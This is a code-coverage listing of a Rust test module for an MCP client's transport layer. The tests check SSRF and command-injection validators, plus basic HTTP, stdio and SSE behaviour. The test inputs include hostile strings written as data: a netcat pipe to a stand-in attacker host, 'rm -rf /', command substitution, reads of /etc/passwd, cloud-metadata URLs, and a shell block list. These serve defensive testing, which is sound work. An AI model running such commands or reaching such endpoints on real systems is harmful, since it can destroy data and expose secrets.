 1120|      1|        assert!(matches!(result, Err(TransportError::InvalidMessage(_))));
                              ^0
 1121|      1|    }
 1122|       |
 1123|       |    #[tokio::test]
 1124|      1|    async fn test_http_transport_receive_when_empty() {
 1125|      1|        let transport = HttpTransport::new_unchecked("http://localhost:8080/mcp".to_string());
 1126|      1|        let result = transport.receive().await;
 1127|      1|        assert!(matches!(result, Err(TransportError::ConnectionClosed)));
                              ^0
 1128|      1|    }
 1129|       |
 1130|       |    #[tokio::test]
 1131|      1|    async fn test_http_transport_close() {
 1132|      1|        let transport = HttpTransport::new_unchecked("http://localhost:8080/mcp".to_string());
 1133|      1|        let result = transport.close().await;
 1134|      1|        assert!(result.is_ok());
 1135|      1|    }
 1136|       |
 1137|       |    // ------------------------------------------------------------------------
 1138|       |    // SSRF Prevention Tests
 1139|       |    // ------------------------------------------------------------------------
 1140|       |
 1141|       |    #[test]
 1142|      1|    fn test_ssrf_blocks_private_ipv4() {
 1143|       |        // RFC 1918 private ranges
 1144|      1|        assert!(HttpTransport::new("http://10.0.0.1/api".to_string()).is_err());
 1145|      1|        assert!(HttpTransport::new("http://172.16.0.1/api".to_string()).is_err());
 1146|      1|        assert!(HttpTransport::new("http://192.168.1.1/api".to_string()).is_err());
 1147|       |
 1148|       |        // Loopback
 1149|      1|        assert!(HttpTransport::new("http://127.0.0.1/api".to_string()).is_err());
 1150|      1|        assert!(HttpTransport::new("http://127.0.0.53/api".to_string()).is_err());
 1151|       |
 1152|       |        // Link-local (cloud metadata)
 1153|      1|        assert!(HttpTransport::new("http://169.254.169.254/api".to_string()).is_err());
 1154|      1|    }
 1155|       |
 1156|       |    #[test]
 1157|      1|    fn test_ssrf_blocks_cloud_metadata() {
 1158|       |        // AWS/GCP metadata endpoint
 1159|      1|        let result = HttpTransport::new("http://169.254.169.254/latest/meta-data/".to_string());
 1160|      1|        assert!(result.is_err());
 1161|       |
 1162|       |        // Google metadata hostname
 1163|      1|        let result = HttpTransport::new("http://metadata.google.internal/computeMetadata/".to_string());
 1164|      1|        assert!(result.is_err());
 1165|      1|    }
 1166|       |
 1167|       |    #[test]
 1168|      1|    fn test_ssrf_blocks_invalid_schemes() {
 1169|       |        // file:// scheme
 1170|      1|        let result = HttpTransport::new("file:///etc/passwd".to_string());
 1171|      1|        assert!(result.is_err());
 1172|       |
 1173|       |        // ftp:// scheme
 1174|      1|        let result = HttpTransport::new("ftp://example.com/file".to_string());
 1175|      1|        assert!(result.is_err());
 1176|      1|    }
 1177|       |
 1178|       |    #[test]
 1179|      1|    fn test_ssrf_allows_public_urls() {
 1180|       |        // Public URLs should be allowed
 1181|       |        // Note: These may fail if DNS resolution fails, but shouldn't fail SSRF validation
 1182|      1|        let result = HttpTransport::new("https://api.example.com/v1".to_string());
 1183|       |        // This will fail DNS resolution but should not fail SSRF validation
 1184|       |        // The error should be about DNS, not SSRF
 1185|      1|        if let Err(e) = result {
                                 ^0
 1186|      0|            let err_str = e.to_string();
 1187|      0|            assert!(!err_str.contains("SSRF"), "Public URL should not trigger SSRF block");
 1188|      1|        }
 1189|      1|    }
 1190|       |
 1191|       |    #[test]
 1192|      1|    fn test_validate_url_for_ssrf_direct() {
 1193|       |        // Test the validation function directly
 1194|      1|        assert!(validate_url_for_ssrf("http://10.0.0.1/api").is_err());
 1195|      1|        assert!(validate_url_for_ssrf("http://192.168.1.1/api").is_err());
 1196|      1|        assert!(validate_url_for_ssrf("http://127.0.0.1/api").is_err());
 1197|      1|        assert!(validate_url_for_ssrf("http://169.254.169.254/latest/meta-data/").is_err());
 1198|      1|        assert!(validate_url_for_ssrf("file:///etc/passwd").is_err());
 1199|       |
 1200|       |        // Invalid URL
 1201|      1|        assert!(validate_url_for_ssrf("not-a-url").is_err());
 1202|      1|    }
 1203|       |
 1204|       |    // ------------------------------------------------------------------------
 1205|       |    // Command Injection Prevention Tests
 1206|       |    // ------------------------------------------------------------------------
 1207|       |
 1208|       |    #[test]
 1209|      1|    fn test_command_injection_blocks_shell_metacharacters() {
 1210|       |        // Semicolon (command separator)
 1211|      1|        assert!(validate_command_for_injection("echo; cat /etc/passwd").is_err());
 1212|       |
 1213|       |        // Pipe
 1214|      1|        assert!(validate_command_for_injection("cat | nc attacker.com").is_err());
 1215|       |
 1216|       |        // Background/AND
 1217|      1|        assert!(validate_command_for_injection("sleep 1 & cat secret").is_err());
 1218|       |
 1219|       |        // Variable expansion
 1220|      1|        assert!(validate_command_for_injection("echo $HOME").is_err());
 1221|       |
 1222|       |        // Command substitution
 1223|      1|        assert!(validate_command_for_injection("echo `whoami`").is_err());
 1224|       |
 1225|       |        // Subshell
 1226|      1|        assert!(validate_command_for_injection("(cat /etc/passwd)").is_err());
 1227|       |
 1228|       |        // Brace expansion
 1229|      1|        assert!(validate_command_for_injection("echo {a,b}").is_err());
 1230|       |
 1231|       |        // Redirection
 1232|      1|        assert!(validate_command_for_injection("cat < /etc/passwd").is_err());
 1233|      1|        assert!(validate_command_for_injection("echo > /tmp/file").is_err());
 1234|       |
 1235|       |        // Newlines (command separator)
 1236|      1|        assert!(validate_command_for_injection("echo\ncat /etc/passwd").is_err());
 1237|      1|    }
 1238|       |
 1239|       |    #[test]
 1240|      1|    fn test_command_injection_blocks_direct_shell() {
 1241|       |        // Direct shell commands should be blocked
 1242|      1|        assert!(validate_command_for_injection("sh").is_err());
 1243|      1|        assert!(validate_command_for_injection("bash").is_err());
 1244|      1|        assert!(validate_command_for_injection("/bin/bash").is_err());
 1245|      1|        assert!(validate_command_for_injection("/usr/bin/bash").is_err());
 1246|      1|        assert!(validate_command_for_injection("zsh").is_err());
 1247|      1|        assert!(validate_command_for_injection("cmd").is_err());
 1248|      1|        assert!(validate_command_for_injection("powershell").is_err());
 1249|      1|    }
 1250|       |
 1251|       |    #[test]
 1252|      1|    fn test_command_injection_allows_safe_commands() {
 1253|       |        // Normal MCP server commands should be allowed
 1254|      1|        assert!(validate_command_for_injection("node").is_ok());
 1255|      1|        assert!(validate_command_for_injection("/usr/bin/node").is_ok());
 1256|      1|        assert!(validate_command_for_injection("python").is_ok());
 1257|      1|        assert!(validate_command_for_injection("python3").is_ok());
 1258|      1|        assert!(validate_command_for_injection("/home/user/.local/bin/mcp-server").is_ok());
 1259|      1|        assert!(validate_command_for_injection("npx").is_ok());
 1260|      1|        assert!(validate_command_for_injection("uv").is_ok());
 1261|      1|    }
 1262|       |
 1263|       |    #[test]
 1264|      1|    fn test_command_injection_empty_command() {
 1265|      1|        assert!(validate_command_for_injection("").is_err());
 1266|      1|    }
 1267|       |
 1268|       |    #[test]
 1269|      1|    fn test_args_injection_blocks_metacharacters() {
 1270|       |        // Arguments with shell metacharacters should be blocked
 1271|      1|        let bad_args = vec![
 1272|      1|            "-c".to_string(),
 1273|      1|            "cat /etc/passwd".to_string(),  // This is fine
 1274|       |        ];
 1275|      1|        assert!(validate_args_for_injection(&bad_args).is_ok());
 1276|       |
 1277|      1|        let bad_args = vec![
 1278|      1|            "-c".to_string(),
 1279|      1|            "cat; rm -rf /".to_string(),  // Semicolon in arg
 1280|       |        ];
 1281|      1|        assert!(validate_args_for_injection(&bad_args).is_err());
 1282|       |
 1283|      1|        let bad_args = vec![
 1284|      1|            "--script=$(whoami)".to_string(),  // Variable expansion
 1285|       |        ];
 1286|      1|        assert!(validate_args_for_injection(&bad_args).is_err());
 1287|      1|    }
 1288|       |
 1289|       |    #[test]
 1290|      1|    fn test_args_injection_allows_safe_args() {
 1291|       |        // Normal arguments should be allowed
 1292|      1|        let safe_args = vec![
 1293|      1|            "--port".to_string(),
 1294|      1|            "8080".to_string(),
 1295|      1|            "--config".to_string(),
 1296|      1|            "/path/to/config.json".to_string(),
 1297|       |        ];
 1298|      1|        assert!(validate_args_for_injection(&safe_args).is_ok());
 1299|       |
 1300|       |        // Arguments with spaces should be fine (shell won't split them)
 1301|      1|        let safe_args = vec![
 1302|      1|            "path with spaces/server.js".to_string(),
 1303|       |        ];
 1304|      1|        assert!(validate_args_for_injection(&safe_args).is_ok());
 1305|      1|    }
 1306|       |
 1307|       |    #[tokio::test]
 1308|      1|    async fn test_stdio_spawn_validates_command() {
 1309|       |        // Shell commands should be blocked
 1310|      1|        let result = StdioTransport::spawn("bash", &["-c".to_string(), "echo test".to_string()]).await;
 1311|      1|        assert!(result.is_err());
 1312|      1|        if let Err(TransportError::CommandValidation(msg)) = result {
 1313|      1|            assert!(msg.contains("shell"));
 1314|      0|        }
 1315|       |
 1316|       |        // Commands with metacharacters should be blocked
 1317|      1|        let result = StdioTransport::spawn("echo; whoami", &[]).await;
 1318|      1|        assert!(result.is_err());
 1319|      1|    }
 1320|       |
 1321|       |    // ------------------------------------------------------------------------
 1322|       |    // SseTransport Tests
 1323|       |    // ------------------------------------------------------------------------
 1324|       |
 1325|       |    #[tokio::test]
 1326|      1|    async fn test_sse_transport_connect_unchecked() {
 1327|      1|        let transport = SseTransport::connect_unchecked("http://localhost:8080/sse".to_string()).await;
 1328|      1|        assert!(transport.is_ok());
 1329|      1|    }
 1330|       |
 1331|       |    #[tokio::test]
 1332|      1|    async fn test_sse_transport_connect_with_config() {
 1333|      1|        let mut headers = HashMap::new();
 1334|      1|        headers.insert("Authorization".to_string(), "Bearer token".to_string());
 1335|      1|        let transport = SseTransport::connect_with_config_unchecked(
 1336|      1|            "http://localhost:8080/sse".to_string(),
 1337|      1|            headers,
 1338|      1|            60,
 1339|      1|        ).await;
 1340|      1|        assert!(transport.is_ok());
 1341|      1|    }
 1342|       |
 1343|       |    #[tokio::test]
 1344|      1|    async fn test_sse_transport_json_fallback() {
 1345|       |        use wiremock::{Mock, MockServer, ResponseTemplate};
 1346|       |        use wiremock::matchers::{method, path};
 1347|       |
 1348|      1|        let mock_server = MockServer::start().await;
 1349|       |
 1350|      1|        let response_json = serde_json::json!({
 1351|      1|            "jsonrpc": "2.0",
 1352|      1|            "id": 1,
 1353|      1|            "result": {"status": "ok"}
 1354|       |        });
 1355|       |
 1356|      1|        Mock::given(method("POST"))
 1357|      1|            .and(path("/sse"))
 1358|      1|            .respond_with(
 1359|      1|                ResponseTemplate::new(200)
 1360|      1|                    .set_body_json(&response_json)
 1361|      1|                    .insert_header("Content-Type", "application/json")
 1362|      1|            )
 1363|      1|            .mount(&mock_server)
 1364|      1|            .await;
 1365|       |
 1366|      1|        let transport = SseTransport::connect_unchecked(format!("{}/sse", mock_server.uri())).await.unwrap();
 1367|      1|        let request = Message::request(1, "test/method", None);
 1368|       |
 1369|      1|        transport.send(request).await.unwrap();
 1370|      1|        let response = transport.receive().await.unwrap();
 1371|       |
 1372|      1|        assert!(response.result.is_some());
 1373|      1|    }
 1374|       |
 1375|       |    #[tokio::test]
 1376|      1|    async fn test_sse_transport_close() {
 1377|      1|        let transport = SseTransport::connect_unchecked("http://localhost:8080/sse".to_string()).await.unwrap();
 1378|      1|        let result = transport.close().await;
 1379|      1|        assert!(result.is_ok());
 1380|      1|    }
 1381|       |
 1382|       |    #[tokio::test]
 1383|      1|    async fn test_sse_ssrf_blocks_private_ip() {
 1384|      1|        let result = SseTransport::connect("http://192.168.1.1/sse".to_string()).await;
 1385|      1|        assert!(result.is_err());
 1386|       |
 1387|      1|        let result = SseTransport::connect("http://10.0.0.1/sse".to_string()).await;
 1388|      1|        assert!(result.is_err());
 1389|      1|    }
 1390|       |
 1391|       |    // ------------------------------------------------------------------------
 1392|       |    // TransportError Tests
 1393|       |    // ------------------------------------------------------------------------
 1394|       |
 1395|       |    #[test]
 1396|      1|    fn test_transport_error_display() {
 1397|      1|        let err = TransportError::Timeout;
 1398|      1|        assert_eq!(format!("{}", err), "Timeout");
 1399|       |
 1400|      1|        let err = TransportError::ConnectionClosed;
 1401|      1|        assert_eq!(format!("{}", err), "Connection closed");
 1402|       |
 1403|      1|        let err = TransportError::Http("404 Not Found".to_string());
 1404|      1|        assert!(format!("{}", err).contains("404 Not Found"));
 1405|      1|    }
 1406|       |
 1407|       |    #[test]
 1408|      1|    fn test_transport_error_from_io() {
 1409|      1|        let io_err = std::io::Error::new(std::io::ErrorKind::NotFound, "file not found");
 1410|      1|        let transport_err: TransportError = io_err.into();
 1411|      1|        assert!(matches!(transport_err, TransportError::Spawn(_)));
                              ^0
 1412|      1|    }
 1413|       |
 1414|       |    #[test]
 1415|      1|    fn test_validate_url_ssrf_protection() {
 1416|       |        // Private IP ranges
 1417|      1|        assert!(validate_url_for_ssrf("http://127.0.0.1/api").is_err());
 1418|      1|        assert!(validate_url_for_ssrf("http://localhost/api").is_err()); // resolves to 127.0.0.1
 1419|      1|        assert!(validate_url_for_ssrf("http://10.0.0.5/api").is_err());
 1420|      1|        assert!(validate_url_for_ssrf("http://192.168.1.1/api").is_err());
 1421|      1|        assert!(validate_url_for_ssrf("http://172.16.0.1/api").is_err());
 1422|       |        
 1423|       |        // Cloud metadata
 1424|      1|        assert!(validate_url_for_ssrf("http://169.254.169.254/latest/meta-data").is_err());
 1425|      1|        assert!(validate_url_for_ssrf("http://metadata.google.internal/").is_err());
 1426|       |        
 1427|       |        // Schemes
 1428|      1|        assert!(validate_url_for_ssrf("ftp://example.com").is_err());
 1429|      1|        assert!(validate_url_for_ssrf("file:///etc/passwd").is_err());
 1430|       |        
 1431|       |        // Valid
 1432|      1|        assert!(validate_url_for_ssrf("https://api.example.com/v1").is_ok());
 1433|      1|        assert!(validate_url_for_ssrf("http://example.com/v1").is_ok());
 1434|      1|    }
 1435|       |
 1436|       |    #[test]
 1437|      1|    fn test_validate_command_injection() {
 1438|       |        // Safe commands
 1439|      1|        assert!(validate_command_for_injection("ls").is_ok());
 1440|      1|        assert!(validate_command_for_injection("/usr/bin/python3").is_ok());
 1441|       |        
 1442|       |        // Shell metacharacters
 1443|      1|        assert!(validate_command_for_injection("ls; rm -rf /").is_err());
 1444|      1|        assert!(validate_command_for_injection("ls | grep foo").is_err());
 1445|      1|        assert!(validate_command_for_injection("echo $HOME").is_err());
 1446|      1|        assert!(validate_command_for_injection("`whoami`").is_err());
 1447|      1|        assert!(validate_command_for_injection("foo && bar").is_err());
 1448|       |        
 1449|       |        // Direct shell execution
 1450|      1|        assert!(validate_command_for_injection("bash").is_err());
 1451|      1|        assert!(validate_command_for_injection("/bin/sh").is_err());
 1452|      1|        assert!(validate_command_for_injection("powershell.exe").is_err());
 1453|      1|    }
 1454|       |
 1455|       |    #[test]
 1456|      1|    fn test_validate_args_injection() {
 1457|      1|        let args = vec!["-la".to_string(), "/tmp".to_string()];
 1458|      1|        assert!(validate_args_for_injection(&args).is_ok());
 1459|       |        
 1460|      1|        let bad_args = vec!["-la".to_string(), "; rm -rf /".to_string()];
 1461|      1|        assert!(validate_args_for_injection(&bad_args).is_err());
 1462|      1|    }
 1463|       |
 1464|       |    // Mock test for message serialization/deserialization compatibility
 1465|       |    #[test]
 1466|      1|    fn test_message_format() {
 1467|      1|        let msg = Message::request(1, "tools/list", None);
 1468|      1|        let json = serde_json::to_string(&msg).unwrap();
 1469|      1|        let parsed: Message = serde_json::from_str(&json).unwrap();
 1470|       |        
 1471|      1|        assert!(parsed.is_request());
 1472|      1|        assert_eq!(parsed.method, Some("tools/list".to_string()));
 1473|      1|        assert_eq!(parsed.id, Some(serde_json::json!(1)));
 1474|      1|    }
 1475|       |}